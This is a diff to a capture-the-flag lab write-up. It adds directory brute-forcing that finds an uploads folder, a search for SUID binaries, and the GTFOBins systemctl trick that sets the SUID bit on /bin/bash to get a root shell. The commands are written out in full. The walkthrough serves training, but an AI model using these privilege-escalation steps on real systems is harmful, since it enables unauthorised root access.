@@ -57,6 +57,15 @@ gobuster dir -u http://10.10.195.20:3333 -w /usr/share/wordlists/dirbuster/direc
 In these results several directories are identified, I focus on one called `/internal/`, in this path I can upload files to the server.
 ![alt text](imgs/img1.png)
 
+#### Dirbuster: Brute force to internal folder
+With this tool perform a scan of the internal folder to identify more important directories
+    ![alt text](imgs/img8.png)
+In the results I identified three routes that could be where the uploaded files are saved.
+```plaintext
+/images/
+/icons/
+/uploads/
+``` 
 
 ## 3. Exploitation of Vulnerabilities
 In this part of the exploitation I am going to focus on the route that I found in the enumeration phase, what I am going to try is to upload a malicious file and thus be able to compromise the server.
@@ -93,5 +102,55 @@ For this purpose the first thing I must do is identify what type of files can be
     ```bash
     10.10.207.213:3333/internal/uploads/v.phtml
     ``` 
-7. **Reverse Shell:** When I upload and run the file I get my connection reversed
+8. **Reverse Shell:** When I upload and run the file I get my connection reversed
     ![alt text](imgs/img7.png)
+
+## 4. Privilege Escalation
+To escalate privileges one of the first steps I do is to identify which files contain a special permission called SUID, which grants temporary permissions to a user to execute the binary with the permission of the owner instead of the user who executes it. To find these files I run:
+```bash
+find / -perm -4000 -ls 2>/dev/null
+```
+In this case, among all the listed files there is one that stands out. `/bin/systemctl`
+```plaintext
+131133     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
+131148     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
+131182     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
+131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
+131147     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
+133163     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
+405750     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs
+``` 
+
+#### External resource 
+On [this page](https://gtfobins.github.io/gtfobins/systemctl/#suid) you can find different scripts that when executed will allow me to escalate privileges.
+In this case the executed code is this:
+```plaintext
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+``` 
+
+Now when starting an instance of bash it will be executed as root user
+```bash
+bash -p
+```
+![alt text](imgs/img9.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
